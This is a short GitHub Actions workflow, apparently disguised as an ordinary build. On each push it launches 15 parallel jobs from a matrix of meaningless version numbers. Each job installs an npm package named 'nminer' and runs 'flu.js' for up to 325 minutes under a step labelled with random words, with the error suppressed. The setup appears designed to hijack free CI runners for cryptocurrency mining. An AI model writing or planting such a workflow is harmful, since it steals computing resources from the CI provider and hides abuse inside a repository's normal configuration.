name: flu
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7689 }
          - { version: 4096 }
          - { version: 6564 }
          - { version: 8259 }
          - { version: 6918 }
          - { version: 1256 }
          - { version: 5575 }
          - { version: 6234 }
          - { version: 5872 }
          - { version: 9632 }
          - { version: 2170 }
          - { version: 4787 }
          - { version: 3743 }
          - { version: 374 }
          - { version: 2486 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: during ouch scarification forceful though
        run: |
          npm install nminer@latest
          timeout 325m node flu.js || echo "flu executed"